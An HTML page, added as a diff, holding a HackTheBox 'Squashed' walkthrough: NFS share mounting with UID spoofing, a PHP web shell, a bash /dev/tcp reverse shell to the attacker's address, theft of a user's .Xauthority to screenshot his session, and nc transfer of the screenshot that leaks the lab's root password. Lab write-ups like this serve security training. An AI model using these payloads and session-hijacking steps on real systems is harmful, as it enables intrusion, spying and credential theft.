@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html>
+<div id="particles-js">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+<!--  Essential META Tags -->
+<meta property="og:title" content="Squashed HackTheBox Writeup">
+<meta name="description" content="Squashed HackTheBox Writeup | 0xv01d">
+<meta property="og:type" content="article" />
+<meta property="og:image" content="/images/HTB/Squashed/Squashed_card.png">
+<meta property="og:url" content="https://0xv01d.github.io/hackthebox/Squashed">
+<meta name="twitter:card" content="/images/HTB/Squashed/Squashed_card.png">
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <script src="/Scripts/js/particles.js"></script>
+    <script src="/Scripts/js/app.js"></script>
+<title>Squashed HTB Writeup | 0xv01d</title>
+<meta property="og:locale" content="en_US">
+<script type="application/ld+json">
+</script>
+
+    <link rel="stylesheet" href="/Styles/style.css?v=">
+	<link rel="stylesheet" href="/Styles/highlight_monokai.css">
+<!-- Setup Google Analytics -->
+
+	<link rel="shortcut icon" type="image/x-icon" href="/images/HTB/squashed/favicon.ico">
+
+<!--Information Sidebar-->
+
+  </head>
+  <body>
+      <header class="app-header">
+        <a href="https:0xv01d.github.io">
+          <img class="avatar" src="/images/index/avatar.png">
+		</a><p></p>
+		<h1><strong>0xv01d</strong></h1>
+		<nav class="app-header-menu">
+			<a class="app-header-menu-item" href="/">Home</a>
+             - 
+			<a class="app-header-menu-item" href="/tags/">Tags</a>
+             - 
+			<a class="app-header-menu-item" href="/about/">About</a>
+		</nav>
+		<p>Just another computer adict.</p>
+		<div text-align:="" center;="" width:="" 100%;="" class="app-header-media">
+			<a class="fab fa-github-square" href="https://github.com/0xv01d" rel="noreferrer noopener" target="_blank"><img src="/images/index/github.png"></a>
+			<a class="fab fa-envelope-square" href="mailto:im_0xv01d@outlook.com" rel="noreferrer noopener" target="_blank"><img src="/images/index/email.png"></img></a>
+			<a href="https://discord.com/users/504974900239400961" class="fab fa-discord" rel="noreferrer noopener" target="_blank"></a>
+			<a class="fab fa-twitter-square" href="https://twitter.com/0xEr3bus" rel="noreferrer noopener" target="_blank"></a>
+		</div>
+        <a href="https://www.hackthebox.com/profile/1120840" rel="noreferrer noopener" target="_blank">
+			<img src="http://www.hackthebox.eu/badge/image/1120840" alt="Hack The Box">
+        </a>
+        <div style="height: 7rem;"></div>
+      </header>
+
+      <main class="app-container">
+		
+		<article class="post">		
+			<header class="post-header">
+
+	
+<!--Machine Title-->
+			<div class="title">Squashed Walkthrough</div>			
+<!--Skill Tags-->								
+			<div class="tag-skills">
+				<svg class="icon icon-tag svg-tag" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+					<title>tag</title>
+					<path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" x2="7.01" y1="7" y2="7"></line>
+				</svg>
+				<a class="tag" href="#">NFS</a>
+				<a class="tag" href="#">Mount</a>
+				<a class="tag" href="#">PHP</a>
+				<a class="tag" href="#">KDBX</a>
+				<a class="tag" href="#">Xauthority</a>
+			</div>
+
+			</header>
+
+<!--Machine Card-->			
+			<div><img class="machine-card" style="max-width: 597px;" src="/images/HTB/squashed/squashed_card.png"></img></div>
+			
+<!--Machine Overview-->
+			<div class="subtitle">Squashed Overview</div>
+			<p class="paragraph"><a href="https://app.hackthebox.com/machines/Squashed" rel="noreferrer noopener" target="_blank">Squashed</a> machine on HackTheBox, submitted by 
+			<a href="https://app.hackthebox.com/users/159204" rel="noreferrer noopener" target="_blank">polarbearer</a> & <a href="https://app.hackthebox.com/users/458049" rel="noreferrer noopener" target="_blank">c4rm3l0</a>. The machine starts with an nfs share mount into
+			which we can upload files that lead to gaining acces to the machine. After that, we find an Xauthority file that we can abuse to take a screenshot of another user's session that leaks the root password.
+
+<!--Machine Resolution-->
+			<h1 id="header-1">Recon</h1>
+
+            <p class="head-img">As always let's start with a port scan, we have ssh, http, rpc and nfs, as nfs is open we can take a look at the shared mounts</p>
+            <img class="img-post" style="max-width: 1256px;" src="/images/HTB/squashed/nmap.png"></img>
+            <img class="img-post" style="max-width: 1256px;" src="/images/HTB/squashed/nmap_2.png"></img>
+
+            <p class="head-img">We have two shared mounts, let's mount them</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯ </span><span class="ld"><span class="kt">showmount</span> -e 10.10.11.191
+Export list for 10.10.11.191:
+/home/ross    *
+/var/www/html *
+
+<span class="na">❯ </span><span class="kt">mkdir</span> /tmp/www /tmp/home_ross
+<span class="na">❯ </span><span class="kt">sudo mount</span> -t nfs 10.10.11.191:/home/ross /tmp/home_ross
+<span class="na">❯ </span><span class="kt">sudo mount</span> -t nfs 10.10.11.191:/var/www/html /tmp/www
+</span> </code></pre></div></div>
+
+			<p class="head-img">Once we mount them we can see some interesting files, in /home/ross we can see a Passwords.kdbx file which is a keepass database, also a .Xauthority that manage the GUI, among other stuff, we also can't acces in /var/www/html, that's because we don't own or belong to the group, but we can add another user to acces</p>
+		<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯ </span><span class="ld"><span class="kt">ls</span> -l
+<span class="x">d</span><span class="kt">r</span><span class="ng">w</span><span class="gd">x</span><span class="kt">r</span>-<span class="gd">x</span><span class="kt">r</span>-<span class="gd">x</span> <span class="k">1001    1001     4.0 KB</span> <span class="na">Sun Jan  1 18:02:37 2023</span> <span class="x"> home_ross</span>
+<span class="x">d</span><span class="kt">r</span><span class="ng">w</span><span class="gd">x</span><span class="kt">r</span>-<span class="gd">x</span><span class="kt">r</span>-- <span class="k">2017    www-data 4.0 KB</span><span class="na"> Mon Jan  2 16:25:01 2023</span> <span class="x"> www</span>
+
+<span class="na">❯ </span><span class="kt"> tree</span> -fas ./home_ross
+.
+├── [          9]  <span class="kt">./.bash_history -></span> <span class="k">/dev/null</span>
+├── [       4096]  <span class="x">./.cache [error opening dir]</span>
+├── [       4096]  <span class="x">./.config [error opening dir]</span>
+├── [       4096]  <span class="x">./Desktop</span>
+├── [       4096]  <span class="x">./Documents</span>
+│   └── [       1365]  <span class="x">./Documents/Passwords.kdbx</span>
+├── [       4096]  <span class="x">./Downloads</span>
+├── [       4096]  <span class="x">./.gnupg [error opening dir]</span>
+├── [       4096]  <span class="x">./.local [error opening dir]</span>
+├── [       4096]  <span class="x">./Music</span>
+├── [       4096]  <span class="x">./Pictures</span>
+├── [       4096]  <span class="x">./Public</span>
+├── [       4096]  <span class="x">./Templates</span>
+├── [       4096]  <span class="x">./Videos</span>
+├── [          9]  <span class="kt">./.viminfo -> </span><span class="k">/dev/null</span>
+├── [         57]  <span class="x">./.Xauthority</span>
+├── [       2475]  <span class="x">./.xsession-errors</span>
+└── [       2475]  <span class="x">./.xsession-errors.old</span>
+
+12 directories, 6 files
+
+<span class="na">❯ </span><span class="kt">tree</span> -fas ./www
+./www
+
+0 directories, 0 files
+
+<span class="na">❯ </span><span class="kt">cd</span> ./www
+cd: permission denied: ./www
+</span> </code></pre></div></div>
+
+            <p class="head-img">Once we add it, we can get in</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="na">❯ </span><span class="kt">sudo useradd</span> test
+<span class="na">❯ </span><span class="kt">sudo usermod</span> -u 2017 test
+<span class="na">❯ </span><span class="kt">sudo groupmod</span> -g 2017 test
+<span class="na">❯ </span><span class="kt">id</span> test
+uid=2017(test) gid=2017(test) groups=2017(test)
+<span class="na">❯ </span><span class="kt">su</span> test
+$ bash
+
+<span class="gd">┌─[</span>test<span class="k">@</span><span class="kt">Anima</span><span class="gd">]─[</span><span class="kt">/tmp</span><span class="gd">]</span>
+<span class="gd">└──╼ </span><span class="k">$</span>
+
+<span class="na">❯ </span><span class="kt">ls</span> -l
+<span class="x">d</span><span class="kt">r</span><span class="ng">w</span><span class="gd">x</span><span class="kt">r</span>-<span class="gd">x</span><span class="kt">r</span>-- <span class="k">test    www-data 4.0 KB</span><span class="na"> Mon Jan  2 16:25:01 2023</span> <span class="x"> www</span>
+</span> </code></pre></div></div>
+
+
+            <p class="head-img">Since we can write on it, let's send us a reverse shell</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯ </span><span class="ld"><span class="kt">echo</span> <span class="k">"<<span>?</span>php   echo '<<span>pre</span>>' . shell_exec($_REQUEST['cmd']) . '<<span>/pre</span>>'; ?>"</span> > /tmp/www/shell.php
+
+<span class="na">❯ </span><span class="kt">curl</span>  <span class="k">"http://10.10.11.191/shell.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/10.10.16.30/443%200%3E%261%22"</span>
+
+<span class="na">❯ </span><span class="kt">sudo</span> nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.16.30] from (UNKNOWN) [10.10.11.191] 37866
+<span class="kt">alex@squashed</span>:/var/www/html$ whoami
+whoami
+alex
+<span class="kt">alex@squashed</span>:/var/www/html$ 
+</span> </code></pre></div></div>
+
+
+            <p class="head-img">Once we're in we can read the first flag</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="kt">alex@squashed</span>:/home/alex$ cat user.txt 
+448f5f993960efc1a27a783c4229cf59
+<span class="kt">alex@squashed</span>:/home/alex$ 
+</span> </code></pre></div></div>
+
+			<p class="head-img"></p>
+			<h1 id="header-1">PrivEsc</h1>
+
+			<p class="head-img">As we saw before in /home/ross there's a kdbx file, but once we try to extract the hash in order to crack it we can see that the version is not supported by john</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯ </span><span class="ld"><span class="kt">keepass2john</span> Passwords.kdbx
+! Passwords.kdbx : File version '40000' is currently not supported!
+</span> </code></pre></div></div>
+
+            <p class="head-img">However, we saw the .Xauthority file, and as we can see, Ross has an active X session that we can take advantage of.</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="kt">alex@squashed</span>:/home/alex$ w
+ 01:21:05 up 1 day,  2:18,  1 user,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+ross     tty7     :0               Sun23   26:18m  4:07   0.07s /usr/libexec/gn
+<span class="kt">alex@squashed</span>:/home/alex$ 
+</span> </code></pre></div></div>
+
+            <p class="head-img">Well, in order to exploit the <a href="https://book.hacktricks.xyz/network-services-pentesting/6000-pentesting-x11" rel="nonreferrer noopener" target="_blank">.Xauthority</a>, we have to create a user with the specified id which is 1001</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="na">❯ </span><span class="kt">sudo useradd</span> test2
+<span class="na">❯ </span><span class="kt">sudo usermod</span> -u 1001 test2
+<span class="na">❯ </span><span class="kt">su</span> test2
+$ bash
+
+<span class="gd">┌─[</span>test2<span class="k">@</span><span class="kt">Anima</span><span class="gd">]─[</span><span class="kt">/tmp/home_ross</span><span class="gd">]</span>
+<span class="gd">└──╼ </span><span class="k">$</span>
+
+<span class="na">❯ </span><span class="kt">ls</span> -l ./.Xauthority 
+-<span class="kt">r</span><span class="ng">w</span>------- <span class="k">test2    1001 57</span><span class="na"> Jan  1 17:02 </span> <span class="x"> ./.Xauthority</span>
+</span> </code></pre></div></div>
+
+            <p class="head-img">Let's mount a python server and transfer the file from the mount to the machine, so we will have the same .Xauthority as ross</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="na">❯ </span><span class="kt">python3</span> -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+
+<span class="kt">alex@squashed</span>:/home/alex$ wget http://10.10.16.30:8080/.Xauthority 
+--2023-01-03 01:56:03--  http://10.10.16.30:8080/.Xauthority
+Connecting to 10.10.16.30:8080... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 57 [application/octet-stream]
+Saving to: '.Xauthority'
+
+.Xauthority         100%[===================>]      57  46.6 B/s    in 1.2s    
+
+2023-01-03 01:56:07 (46.6 B/s) - '.Xauthority' saved [57/57]
+
+<span class="na">❯ </span><span class="kt">python3</span> -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+10.10.11.191 - - [02/Jan/2023 20:56:05] "GET /.Xauthority HTTP/1.1" 200 -
+</span> </code></pre></div></div>
+
+
+            <p class="head-img">Let's check the connection, and as we can see, Ross has the keepass open, and we could try to take a screen shot of his screen, with some luck we can get something juicy</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="kt">alex@squashed</span>:~$ xdpyinfo -display :0
+<....................................................>
+  visual:
+    visual id:    0x531
+    class:    TrueColor
+    depth:    32 planes
+    available colormap entries:    256 per subfield
+    red, green, blue masks:    0xff0000, 0xff00, 0xff
+    significant bits in color specification:    8 bits
+<span class="kt">alex@squashed</span>:~$
+
+<span class="kt">alex@squashed</span>:~$ xwininfo -root -tree -display :0
+
+xwininfo: Window id: 0x533 (the root window) (has no name)
+
+  Root window id: 0x533 (the root window) (has no name)
+  Parent window id: 0x0 (none)
+     26 children:
+     0x80000b "gnome-shell": ("gnome-shell" "Gnome-shell")  1x1+-200+-200  +-200+-200
+        1 child:
+        0x80000c (has no name): ()  1x1+-1+-1  +-201+-201
+     0x800021 (has no name): ()  802x575+-1+26  +-1+26
+        1 child:
+<span class="kt">        0x1800006 "Passwords - KeePassXC": ("keepassxc" "keepassxc")  800x536+1+38  +0+64</span>
+           1 child:
+           0x18000fe "Qt NET_WM User Time Window": ()  1x1+-1+-1  +-1+63
+<...........................................................................>
+<span class="kt">     0x1a00001 "keepassxc": ("keepassxc" "Keepassxc")  10x10+10+10  +10+10</span>
+<...........................................................................>
+<span class="kt">alex@squashed</span>:~$ 
+</span> </code></pre></div></div>
+
+            <p class="head-img">Let's take the screenshot, and transfer it to our machine</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="kt">alex@squashed</span>:~$ xwd -root -screen -silent -display :0 > screenshot.xwd
+<span class="kt">alex@squashed</span>:~$ file ./screenshot.xwd 
+./screenshot.xwd: XWD X Window Dump image data, "xwdump", 800x600x24
+<span class="kt">alex@squashed</span>:~$ 
+
+<span class="na">❯ </span><span class="kt">sudo nc</span> -nlvp 9001 > scrreenshot.xwd
+[sudo] password for p3rs0na: 
+listening on [any] 9001 ...
+
+<span class="kt">alex@squashed</span>:~$ nc 10.10.16.30 9001 < screenshot.xwd
+
+<span class="na">❯ </span><span class="kt">sudo nc</span> -nlvp 9001 > screenshot.xwd
+[sudo] password for p3rs0na:
+listening on [any] 9001 ...
+connect to [10.10.16.30] from (UNKNOWN) [10.10.11.191] 54166
+
+<span class="na">❯ </span><span class="kt">convert</span> screenshot.xwd screenshot.png
+</span> </code></pre></div></div>
+
+
+            <p class="head-img">Once we display it, we can see a password that appears to be the root's password</p>
+            <img class="img-post" style="max-width: 800px;" src="/images/HTB/squashed/keepass_ss.png"></img>
+
+            <p class="head-img">It is, and that's it, we own it</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="kt">alex@squashed</span>:~$ su root 
+Password: <span class="gd">cah$mei7rai9A</span>
+<span class="kt">root@squashed</span>:/home/alex# whoami
+root
+<span class="kt">root@squashed</span>:/home/alex# id
+uid=0(root) gid=0(root) groups=0(root)
+<span class="kt">root@squashed</span>:/home/alex# cat /root/root.txt 
+06af9306ef91ff5196db950f941388e0
+<span class="kt">root@squashed</span>:/home/alex# 
+</span> </code></pre></div></div>
+
+<a href="#">Go back</a>
+		</article>
+      </main>
+  </body>
+</div>
+</html>
